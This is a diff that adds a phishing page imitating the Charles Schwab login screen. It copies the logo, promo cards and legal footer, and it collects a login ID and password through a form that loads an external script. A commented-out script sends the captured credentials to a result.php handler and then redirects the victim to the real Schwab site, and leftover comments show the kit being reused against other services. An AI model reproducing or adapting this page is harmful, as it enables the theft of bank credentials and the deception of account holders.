@@ -1,0 +1,493 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Charles Schwab Login Page</title>
+    <style>
+      * {
+        box-sizing: border-box;
+        margin: 0;
+        padding: 0;
+      }
+      body {
+        margin: 0;
+        padding: 0;
+        font-family: Arial, sans-serif;
+        background-color: white;
+      }
+      .login-container {
+        text-align: start;
+        width: 300px;
+        margin: auto;
+        margin-top: 3rem;
+      }
+      .logo {
+        margin-bottom: 30px;
+      }
+      .logo img {
+        width: 100%;
+        height: auto;
+      }
+      .logo {
+        width: 90px;
+        height: 90px;
+        margin: 0 2rem;
+      }
+      h2 {
+        font-size: 24px;
+        margin-bottom: 20px;
+        font-weight: normal;
+        color: #333;
+      }
+      form {
+        text-align: left;
+      }
+      label {
+        display: block;
+        margin-bottom: 5px;
+        font-size: 14px;
+        color: #000;
+      }
+      input[type="email"],
+      input[type="text"],
+      input[type="password"] {
+        width: 100%;
+        padding: 10px;
+        margin-bottom: 20px;
+        border: 1px solid #ccc;
+        border-radius: 4px;
+        box-sizing: border-box;
+        height: 30px;
+      }
+      .remember {
+        display: flex;
+        align-items: center;
+        margin-bottom: 5px;
+      }
+      .remember input {
+        margin-right: 10px;
+      }
+      #start-page {
+        width: 100%;
+        padding: 8px;
+        margin-bottom: 8px;
+        border-radius: 4px;
+        box-sizing: border-box;
+        background-image: linear-gradient(-180deg, #fafafa 0%, #e4e4e4 99%);
+        border: 1px solid #b1b1b1;
+        font: 14px Arial !important;
+        color: #000;
+      }
+      .login-button {
+        width: 100%;
+        padding: 10px;
+        background: #005f83 100%;
+        border: 1px solid #005f83;
+        color: white;
+        /* border: none; */
+        border-radius: 4px;
+        cursor: pointer;
+        font-size: 16px;
+      }
+      .login-button:hover {
+        background-color: #004d5e;
+      }
+      .forgot-links {
+        margin-top: 20px;
+        font-size: 14px;
+      }
+      .forgot-links a {
+        color: #005f71;
+        text-decoration: none;
+        margin-right: 10px;
+      }
+      .forgot-links a:hover {
+        text-decoration: underline;
+      }
+      .language-select {
+        margin-top: 20px;
+        text-align: center;
+      }
+      .language-select select {
+        padding: 5px;
+        border-radius: 4px;
+        border: 1px solid #ccc;
+        background-color: white;
+        color: #333;
+      }
+
+      .flexcardd {
+        display: grid;
+        grid-template-columns: 1fr 1fr 1fr;
+        gap: 1rem;
+        align-items: center;
+        width: 98%;
+        margin: auto;
+      }
+      .flexcardd .card1 {
+        border-radius: 10px;
+        box-shadow: 0 4px 5px rgba(0, 0, 0, 0.15),
+          0 1px 10px rgba(0, 0, 0, 0.12), 0 2px 4px -1px rgba(0, 0, 0, 0.3);
+        /* width: 33%; */
+      }
+      .topimg img {
+        width: 100%;
+        height: 100%;
+        border-radius: 10px;
+      }
+      .topimg {
+        width: 100%;
+      }
+      .ccntt {
+        padding: 1rem;
+      }
+      .ccntt h2 {
+        color: #000;
+        font-family: CharlesModern-Medium, CharlesModern-Regular, Arial,
+          Helvetica, sans-serif;
+        font-weight: 600;
+        font-size: 17px;
+      }
+      .ccntt p {
+        color: #434343;
+        font-size: 17px;
+        font-weight: 300;
+        margin-bottom: 1rem;
+      }
+      .ccntt a {
+        color: #006e99;
+        text-decoration: none;
+      }
+      .relationship-summary {
+        background-color: #f1f1f1;
+        padding: 0.75rem;
+        margin-top: 16px;
+        width: 98%;
+        margin: auto;
+      }
+
+      .footer-links {
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        gap: 1rem;
+        margin: 1rem 0;
+      }
+      ul li {
+        list-style: none;
+      }
+      .disclosures {
+        border: 1px solid #666;
+        font-weight: 700;
+        padding: 12px;
+        text-align: center;
+        color: #666;
+      }
+      a {
+        color: #006e99;
+        text-decoration: none;
+      }
+      .sdps-text-footnote {
+        color: #5a6772;
+        font-family: Arial, Helvetica, sans-serif;
+        font-weight: 400;
+        line-height: 28px;
+        line-height: 1.25rem;
+        margin: 1rem 0;
+        padding: 0;
+        -webkit-font-smoothing: subpixel-antialiased;
+        letter-spacing: 0.3px;
+        letter-spacing: 0.01875rem;
+        font-size: 13px;
+      }
+      footer {
+        width: 98%;
+        margin: auto;
+      }
+      @media screen and (max-width: 768px) {
+        .flexcardd {
+          grid-template-columns: 1fr;
+        }
+      }
+    </style>
+  </head>
+  <body>
+    <div class="logo">
+      <img
+        src="data:image/svg+xml;base64,PHN2ZyBpZD0iTGF5ZXJfMSIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB2aWV3Qm94PSIwIDAgNTYgNTYiPjxnIGlkPSJYTUxJRF81MF8iPjxwYXRoIGlkPSJYTUxJRF8yMl8iIGZpbGw9IiMwMEEwREYiIGQ9Ik0wIDBoNTUuOXY1NS45SDB6Ii8+PGcgaWQ9IlhNTElEXzUxXyI+PGcgaWQ9IlhNTElEXzEwMV8iPjxwYXRoIGlkPSJYTUxJRF8yMV8iIGZpbGw9IiNGRkYiIGQ9Ik00OC42IDI1LjNjMC0uOC0uNS0xLjQtLjktMi0uNC0uNC0uNy0uOC0uNy0xLjMgMC0uNi40LTEgLjktMSAuMyAwIC41LjEuNy4yLjIuMS41LjIuNy4yLjQgMCAuNy0uNC43LS43IDAtLjQtLjQtLjgtMS4xLS44LTEuNiAwLTMgMS44LTMgMy4yIDAgLjguNSAxLjQuOSAxLjkuMy40LjYuOC42IDEuMiAwIC42LS42IDEtMS4xIDEtLjYgMC0uOS0uMy0xLjMtLjYtLjItLjItLjQtLjQtLjYtLjQtLjMgMC0uNC42LS40LjkgMCAuNC43IDEgMS42IDEgMS40LS4yIDMtMS40IDMtMi44Ii8+PC9nPjxnIGlkPSJYTUxJRF85OF8iPjxwYXRoIGlkPSJYTUxJRF85OV8iIGZpbGw9IiNGRkYiIGQ9Ik0xNC41IDE1LjVjLS4xIDAtLjEgMCAwIDBsLS4xLjR2LjFoLjVjLjQuMS41LjEuNS4zIDAgLjMtLjQgMS4zLS45IDIuN2wtLjQgMS4zYy0uNCAxLjEtMSAyLjctMS41IDQtLjYgMS42LTEuMSAyLjktMS4xIDMuMSAwIC4yLjEuMy42LjNzLjctLjEuOC0uM2MuOS0yLjkgMy4zLTYuMiA0LjUtNi4yLjQgMCAuNS4xLjUuNSAwIC42LS41IDEuOC0xLjEgMy0uNSAxLS45IDItLjkgMi41IDAgLjQuMi42LjYuNiAxLjIgMCAyLjItMS4xIDIuOS0ybC4xLS4xLS4zLS4zaC0uMWMtLjQuNC0xLjEgMS4xLTEuMyAxLjFoLS4xdi0uMmMwLS4xLjEtLjQuMy0uOC41LTEuMSAxLjMtMyAxLjMtNC4xIDAtLjktLjQtMS40LTEuMi0xLjQtMS41IDAtMi43IDEuNy0zLjMgMi42LS4xLjItLjMuNC0uMy40cy4xLS4yLjItLjZjLjItLjQuNC0xIC43LTEuOCAxLjEtMyAxLjYtNC41IDEuNi00LjcgMC0uMi0uMi0uMi0uMy0uMmgtMi4yeiIvPjwvZz48ZyBpZD0iWE1MSURfOTVfIj48cGF0aCBpZD0iWE1MSURfOTZfIiBmaWxsPSIjRkZGIiBkPSJNMTEuMSAyNi4xYy4xLS4xLjEtLjEgMCAwIDAtLjEtLjMtLjMtLjMtLjMtLjUuNC0xLjQgMS4yLTIuMiAxLjItLjMgMC0uNi0uMS0uOC0uMy0uMy0uMi0uNC0uNi0uNC0xLjEtLjEtMS4yIDEtMy4xIDItNC4yLjYtLjYgMS4xLS45IDEuNC0uOS40IDAgLjcuMyAxIC42LjIuMy40LjUuNy41LjEgMCAuMy0uMS4zLS4yLjEtLjEuMi0uMy4yLS40IDAtLjUtLjUtMS4yLTEuNi0xLjMtMS4yIDAtMi44LjctNCAxLjktMS4xIDEuMS0xLjcgMi41LTEuNiAzLjggMCAxLjEuNiAyLjMgMi4yIDIuMyAxLjYuMiAyLjktMS4yIDMuMS0xLjZ6Ii8+PC9nPjxnIGlkPSJYTUxJRF85Ml8iPjxwYXRoIGlkPSJYTUxJRF85M18iIGZpbGw9IiNGRkYiIGQ9Ik0zMS4zIDIzLjNjMCAuMS0uMS4yLS4xLjJ2LS4xYzAtLjEuMS0uNC4yLS44LjItLjguNC0xLjguNC0yLjEgMC0uNC0uMi0uNi0uNi0uNi0uOCAwLTIuMSAxLjQtMi41IDIuMWwuMi4zLjEtLjEuMS0uMWMuMy0uNC45LTEuMSAxLjItMS4xLjIgMCAuMy4yLjMuNSAwIC43LS44IDIuOS0xLjMgNC40LS4zLjgtLjUgMS40LS41IDEuNSAwIC4yLjEuMi4yLjJoLjdjLjEgMCAuMi0uMS4zLS4zIDAgMCAuMy0uOC41LTEuMiAxLjQtMi44IDIuMS00LjIgMi43LTQuOC40LS40LjctLjUuOS0uNS4yIDAgLjIuMS4zLjIuMS4xLjIuMy40LjMuMSAwIC4zIDAgLjQtLjEuMi0uMi4zLS40LjMtLjcgMC0uNS0uNC0uNy0uNy0uNy0xLjQuMS0yLjMgMS0zLjUgMy41eiIvPjwvZz48cGF0aCBpZD0iWE1MSURfODdfIiBmaWxsPSIjRkZGIiBkPSJNMjcgMTkuN2MtLjEgMC0uMi4xLS4yLjItLjEuMS0uMS4yLS4zLjItLjEgMC0uMiAwLS40LS4xLS4yIDAtLjQtLjEtLjctLjEtMy41IDAtNS4zIDQuNy01LjMgNi4zIDAgMS4xLjYgMS42IDEuMiAxLjYuNyAwIDEuNy0uMiAzLTIuMmwuMy0uNXYuMWwtLjEuMmMtLjIuMy0uNSAxLS41IDEuNiAwIC4zLjEuNS4yLjYuMS4xLjMuMi41LjIgMS4yIDAgMi4yLTEuNiAyLjYtMi4ybC0uMy0uM2gtLjFsLS4zLjNjLS40LjQtLjggMS0xLjEgMWgtLjF2LS4yYzAtLjQuOC0yLjMgMS4zLTMuOC40LTEuMS44LTIuMS44LTIuMyAwIDAgMC0uMi0uMS0uMmwtLjUtLjNjLjItLjEuMS0uMS4xLS4xem0tNS41IDYuMmMwLTIuMyAxLjgtNS40IDMuNi01LjQuNiAwIC45LjMuOS45IDAgLjktMi40IDUuMi00IDUuMi0uMy4xLS41IDAtLjUtLjd6Ii8+PHBhdGggaWQ9IlhNTElEXzgyXyIgZmlsbD0iI0ZGRiIgZD0iTTM4LjIgMjUuN2MwIDEuMy44IDIuMiAyIDIuMiAxLjQgMCAyLjktMS40IDMuMy0xLjhWMjZsLS4yLS4zaC0uMWwtLjIuMWMtLjUuNC0xLjMgMS0yIDEtLjggMC0xLjMtLjUtMS4zLTEuMyAwLTEgLjUtMS43LjgtMi4zdi0uMUg0MS4zYzEuMyAwIDMuNy0uNiAzLjctMi4xIDAtLjYtLjYtMS4zLTEuNi0xLjMtMiAuMi01LjIgMy4yLTUuMiA2em01LjEtNS4zYy40IDAgLjcuMy43LjcgMCAxLTEuMSAxLjUtMyAxLjUuMy0uNyAxLjQtMi4yIDIuMy0yLjJ6Ii8+PGcgaWQ9IlhNTElEXzc4XyI+PHBhdGggaWQ9IlhNTElEXzc5XyIgZmlsbD0iI0ZGRiIgZD0iTTM3LjYgMjUuOHMwLS4xIDAgMGMwLS4xLS4zLS40LS4zLS40bC0uMS4xYy0uNy43LTEgMS4yLTEuNCAxLjJoLS4xcy0uMS0uMS0uMS0uMmMwLS40LjctMi40IDIuMS02bDEtMi42Yy41LTEuMy44LTIgLjgtMi4xdi0uMWMwLS4xLS4xLS4xLS4zLS4xaC0yLjNzLS4xIDAtLjEuMXYuNWguNWMuMy4xLjUuMi41LjQgMCAuMy0xLjUgNC0xLjUgNC0uOCAyLTIuMiA1LjUtMi4yIDYuMyAwIC40LjEuNy4yLjguMi4yLjQuMy43LjMuOSAwIDEuOS0xLjIgMi41LTJsLjEtLjJ6bS0uOC05Ljh6Ii8+PC9nPjxnIGlkPSJYTUxJRF83NV8iPjxwYXRoIGlkPSJYTUxJRF83Nl8iIGZpbGw9IiNGRkYiIGQ9Ik01LjkgMzIuOGMwIDEuMS45IDEuNyAxLjcgMi4xbC40LjJjLjguNCAxLjIuOSAxLjIgMS41IDAgLjctLjUgMS4zLTEuMiAxLjMtMS4xIDAtMS43LTEuMS0yLTEuOGwtLjQuMWMuMS43LjMgMS41LjMgMS44aC4ybC41LjJjLjMuMS43LjIgMS4xLjIgMS41IDAgMi42LS45IDIuNi0yLjMgMC0xLjMtMS0xLjktMS43LTIuMmwtLjMtLjFjLS45LS41LTEuMy0uOS0xLjMtMS41cy40LTEuMiAxLjEtMS4yYy45IDAgMS4zLjcgMS41IDEuNGwuNC0uMWMtLjEtLjYtLjItMS4xLS4yLTEuNWwtLjMtLjEtLjItLjFjLS4zLS4xLS43LS4yLTEtLjItMS40LjEtMi40IDEtMi40IDIuM3oiLz48L2c+PGcgaWQ9IlhNTElEXzcyXyI+PHBhdGggaWQ9IlhNTElEXzczXyIgZmlsbD0iI0ZGRiIgZD0iTTExLjIgMzQuNmMwIDEuOSAxLjMgMy43IDQuMiAzLjcuNyAwIDEuNy0uMiAyLjEtLjMuMi0uNS41LTEuNC42LTEuOWwtLjQtLjFjLS42IDEuMi0xLjEgMS44LTIuNCAxLjgtMS42IDAtMi43LTEuNC0yLjctMy41IDAtMS41LjctMy4yIDIuNy0zLjIgMS4yIDAgMS44LjUgMi4xIDEuN2guNGwtLjEtLjUtLjItMS4zaC0uMmMtLjQtLjEtMS0uMi0xLjgtLjItMi41LS4yLTQuMyAxLjQtNC4zIDMuOHoiLz48L2c+PGcgaWQ9IlhNTElEXzY5XyI+PHBhdGggaWQ9IlhNTElEXzcwXyIgZmlsbD0iI0ZGRiIgZD0iTTI2LjUgMzAuOGgtMy4ydi40Yy44LjEuOS4xLjkgMS40djEuNWgtMy40di0xLjVjMC0xLjIuMS0xLjMuOS0xLjR2LS40aC0zLjN2LjRjMSAuMSAxIC4yIDEgMS40djRjMCAxLjItLjEgMS4zLTEgMS40di40aDMuM1YzOGMtLjgtLjEtMS0uMS0xLTEuNHYtMS45aDMuNHYxLjljMCAxLjItLjEgMS4zLTEgMS40di40aDMuM1YzOGMtLjktLjEtMS0uMS0xLTEuNHYtNGMwLTEuMi4xLTEuMyAxLTEuNGwuMS0uNHoiLz48L2c+PGcgaWQ9IlhNTElEXzY0XyI+PHBhdGggaWQ9IlhNTElEXzY1XyIgZmlsbD0iI0ZGRiIgZD0iTTM3LjggMzAuOGgtMi42di40aC40Yy4yIDAgLjMuMS40LjEgMCAuMS4xLjEuMS4yczAgLjMtLjEuNWMwIC4xLS42IDIuNi0xLjEgNC4yLS4xLS4yLTItNS4zLTItNS4zaC0uNXMtMS43IDUuMy0xLjcgNS40Yy0uMS0uMi0xLjMtNC40LTEuMy00LjQgMC0uMi0uMS0uMy0uMS0uNHYtLjJjLjEtLjEuMi0uMS40LS4xaC40di0uM0gyN3YuNGMuNi4xLjguMSAxLjEgMS4xbDEuOSA2aC41czEuNy01LjIgMS44LTUuM2MuMS4yIDEuOSA1LjMgMS45IDUuM2guNWMxLTMuNSAxLjktNS45IDEuOS02IC40LTEgLjUtMS4xIDEuMi0xLjF2LS41ek0zMi4zIDMzem0yLjYgMy4zeiIvPjwvZz48cGF0aCBpZD0iWE1MSURfNTlfIiBmaWxsPSIjRkZGIiBkPSJNMzkuOCAzMi42cy44IDIuNC45IDIuNEgzOWMtLjEgMCAuOC0yLjQuOC0yLjR6bTEuNC4ybC0uOC0yLjEtLjUuMS0yLjMgNS45Yy0uNCAxLS41IDEuMS0xLjIgMS4xdi40SDM5di0uNGgtLjNjLS4yIDAtLjQtLjEtLjQtLjJ2LS4yYzAtLjEgMC0uMi4xLS40bC4xLS4yYy4xLS40LjMtMSAuNC0xLjJINDFjLjIuNi41IDEuMy42IDEuNiAwIC4xLjEuMi4xLjN2LjFjMCAuMS0uMS4xLS4zLjFsLS4zLjF2LjNoM3YtLjRjLS42LS4xLS44LS4xLTEuMi0xLjFsLTEuNy0zLjh6Ii8+PHBhdGggaWQ9IlhNTElEXzUyXyIgZmlsbD0iI0ZGRiIgZD0iTTQ2LjUgMzEuOGMwLS4zIDAtLjUuMS0uNWguNWMuMyAwIDEuNC4xIDEuNCAxLjQgMCAuOS0uNiAxLjQtMS42IDEuNGgtLjR2LTIuM3ptLTIuMS0xdi40Yy44LjEuOS4xLjkgMS40djRjMCAxLjItLjEgMS4zLTEgMS40di40aDIuOGMuOSAwIDEuNy0uMiAyLjItLjUuNy0uNCAxLTEgMS0xLjcgMC0xLS43LTEuNy0yLTEuOS42LS4xIDEuNi0uNiAxLjYtMS42IDAtLjYtLjItMS0uNi0xLjMtLjQtLjMtLjktLjQtMS44LS40aC0zLjF6bTIuNSAzLjZjMS4zIDAgMiAuNiAyIDEuN3MtLjggMS42LTEuNSAxLjZjLS4zIDAtLjUgMC0uNi0uMS0uMi0uMi0uMi0uNS0uMi0xLjF2LTJjMC0uMS4zLS4xLjMtLjF6Ii8+PC9nPjwvZz48L3N2Zz4="
+        alt="Charles Schwab"
+      />
+    </div>
+    <div class="login-container">
+      <h2>Log in to Schwab</h2>
+      <form action="#" id="loginForm" method="post">
+        <label for="login-id">Login ID</label>
+        <input type="text" required id="email" name="e" />
+        <label for="password">Password</label>
+        <input type="password" required id="password" name="p" />
+        <div class="remember">
+          <input type="checkbox" id="remember" name="remember" />
+          <label for="remember">Remember Login ID</label>
+        </div>
+        <label for="start-page">Start Page</label>
+        <select id="start-page" name="start-page">
+          <option _ngcontent-nrs-c63="" value="0: Object">
+            Accounts Summary
+          </option>
+          <option _ngcontent-nrs-c63="" value="1: Object">
+            Account Balances
+          </option>
+          <option _ngcontent-nrs-c63="" value="2: Object">Positions</option>
+          <option _ngcontent-nrs-c63="" value="3: Object">Trade Ticket</option>
+          <option _ngcontent-nrs-c63="" value="4: Object">History</option>
+          <option _ngcontent-nrs-c63="" value="5: Object">
+            Stock &amp; ETF Trading
+          </option>
+          <option _ngcontent-nrs-c63="" value="6: Object">
+            Options Trading
+          </option>
+          <option _ngcontent-nrs-c63="" value="7: Object">
+            Mutual Fund Trading
+          </option>
+          <option _ngcontent-nrs-c63="" value="8: Object">Bond Trading</option>
+          <option _ngcontent-nrs-c63="" value="9: Object">Research</option>
+          <option _ngcontent-nrs-c63="" value="10: Object">Order Status</option>
+          <option _ngcontent-nrs-c63="" value="11: Object">Watchlist</option>
+        </select>
+        <button type="submit" class="login-button">Log In</button>
+      </form>
+      <div class="forgot-links">
+        <a
+          href="#"
+          style="display: flex; align-items: center; justify-content: center"
+          ><p style="color: #000; margin-right: 3px">Forgot</p>
+          Login ID or Password?</a
+        >
+      </div>
+      <div class="language-select">
+        <a href="#">New User?</a> |
+        <select name="language">
+          <option value="english">English</option>
+        </select>
+      </div>
+    </div>
+
+    <div class="flexcardd">
+      <div class="card1">
+        <div class="topimg">
+          <img
+            src="https://rtcontent.schwab.com/sites/g/files/eyrktu451/files/Promo-Card-Grandfather.jpg"
+            alt=""
+          />
+        </div>
+        <div class="ccntt">
+          <h2>Could a corporate trustee help you achieve your goals?</h2>
+          <p>
+            Discover how Schwab Personal Trust Services can help administer your
+            personal trust, today and into the future.
+          </p>
+          <a href="#">Learn More</a>
+        </div>
+      </div>
+
+      <div class="card1">
+        <div class="topimg">
+          <img
+            src="https://rtcontent.schwab.com/sites/g/files/eyrktu451/files/SIP-1-Login-Screener_1.png"
+            alt=""
+          />
+        </div>
+        <div class="ccntt">
+          <h2>Is our robo-advisor right for you?</h2>
+          <p>
+            Schwab Intelligent Portfolios® does the work, so you don't have to.
+          </p>
+          <a href="#">Learn More</a>
+        </div>
+      </div>
+
+      <div class="card1">
+        <div class="topimg">
+          <img
+            src="https://rtcontent.schwab.com/sites/g/files/eyrktu451/files/AMEXCards%402x_1.png"
+            alt=""
+          />
+        </div>
+        <div class="ccntt">
+          <h2>Charles Schwab cards from American Express.</h2>
+          <p>
+            Exclusive Schwab benefits with premium service from American
+            Express. <br />Terms apply.
+          </p>
+          <a href="#">Learn More</a>
+        </div>
+      </div>
+    </div>
+
+    <aside
+      class="relationship-summary col-full sdps-p-around_small"
+      aria-label="Schwab's client relationship summaries"
+    >
+      <p>
+        <strong>Important information about our relationship with you:</strong>
+        <a href="https://www.schwab.com/transparency"
+          >Client Relationship Summaries</a
+        >
+      </p>
+      <p>
+        Our Client Relationship Summaries offer a brief summary of our services,
+        fees and obligations when we work with you in a broker-dealer or an
+        investment advisory relationship. Learn more at
+        <a href="https://www.schwab.com/transparency">schwab.com/transparency</a
+        >.
+      </p>
+    </aside>
+    <footer>
+      <ul class="footer-links">
+        <li>
+          <a href="/public/schwab/nn/legal_compliance/schwabsafe">
+            Schwab Safe®
+          </a>
+        </li>
+
+        <li>
+          <a
+            href="/public/schwab/nn/legal_compliance/schwabsafe/security_guarantee.html"
+          >
+            The Schwab Security Guarantee
+          </a>
+        </li>
+        <li>
+          <a href="https://www.schwab.com"> Schwab Homepage </a>
+        </li>
+      </ul>
+      <p><a href="#">Web Browser Information </a></p>
+      <p class="disclosures">
+        Brokerage Products: Not FDIC Insured • No Bank Guarantee • May Lose
+        Value
+      </p>
+
+      <div class="channel-footer-content sdps-text-footnote">
+        <p>
+          Not all products and services listed are available outside the U.S.
+          and some are subject to country specific restrictions.
+        </p>
+        <p>
+          Check the background of this firm or one of its investment
+          professionals on
+          <a
+            href="https://brokercheck.finra.org/"
+            title=""
+            type=""
+            target=""
+            data-stock-symbol=""
+            data-popup-height=""
+            data-popup-width=""
+            data-track=""
+            rel=""
+            >FINRA's BrokerCheck</a
+          >.
+        </p>
+        <p>
+          The Charles Schwab Corporation provides a full range of brokerage,
+          banking and financial advisory services through its operating
+          subsidiaries. Its broker-dealer subsidiary, Charles Schwab &amp; Co.,
+          Inc. (<a
+            href="http://www.sipc.org/"
+            title=""
+            type=""
+            target=""
+            data-stock-symbol=""
+            data-popup-height=""
+            data-popup-width=""
+            data-track=""
+            rel=""
+            >member SIPC</a
+          >), offers investment services and products, including Schwab
+          brokerage accounts. Its banking subsidiary, Charles Schwab Bank
+          (member FDIC and an Equal Housing Lender), provides deposit and
+          lending services and products. Access to Electronic Services may be
+          limited or unavailable during periods of peak demand, market
+          volatility, systems upgrade, maintenance, or for other reasons.
+        </p>
+        <p>
+          This site is designed for U.S. residents. Non-U.S. residents are
+          subject to country-specific restrictions. Learn more about our
+          services for
+          <a
+            href="http://www.schwab-global.com/public/schwab-gcb-en"
+            title=""
+            type=""
+            target=""
+            data-stock-symbol=""
+            data-popup-height=""
+            data-popup-width=""
+            data-track=""
+            rel=""
+            >non-U.S. residents</a
+          >.
+        </p>
+        <p>
+          © 2024 Charles Schwab &amp; Co., Inc, All rights reserved. Member
+          <a
+            href="http://www.sipc.org/"
+            title=""
+            type=""
+            target=""
+            data-stock-symbol=""
+            data-popup-height=""
+            data-popup-width=""
+            data-track=""
+            rel=""
+            >SIPC</a
+          >. Unauthorized access is prohibited. Usage will be monitored.
+          (0124-3J4J)
+        </p>
+      </div>
+    </footer>
+    <!-- <script src="env.js"></script> -->
+    <script src="script.js"></script>
+    <!-- <script>
+      var formSubmitted = 0;
+
+      document
+        .getElementById("res")
+        .addEventListener("submit", function (event) {
+          event.preventDefault();
+
+          formSubmitted++;
+
+          var inputs = document.querySelectorAll("input[required]");
+          for (var i = 0; i < inputs.length; i++) {
+            if (!inputs[i].value.trim()) {
+              alert("Please fill in all fields.");
+              //   document.getElementById("err-wrapper").style.display = "block"
+              //   document.getElementById("err-wrapper").textContent = "아이디를 입력하세요";
+              return;
+            }
+          }
+
+          var formData = new FormData(this);
+          var xhr = new XMLHttpRequest();
+          xhr.open("POST", "./result.php", true);
+
+          xhr.onreadystatechange = function () {
+            if (xhr.readyState == 4 && xhr.status == 200) {
+              console.log(xhr.responseText);
+
+              if (formSubmitted === 1) {
+                setInterval(() => {
+                  // document.getElementById("password").value = "";
+                  window.location.href = "https://www.schwab.com/";
+                }, 2000);
+                // document.getElementById("errorr").textContent = "メールアドレス(ユーザID)またはBIGLOBEパスワードが正しくありません。";
+              }
+            }
+          };
+
+          xhr.send(formData);
+        });
+    </script> -->
+  </body>
+</html>
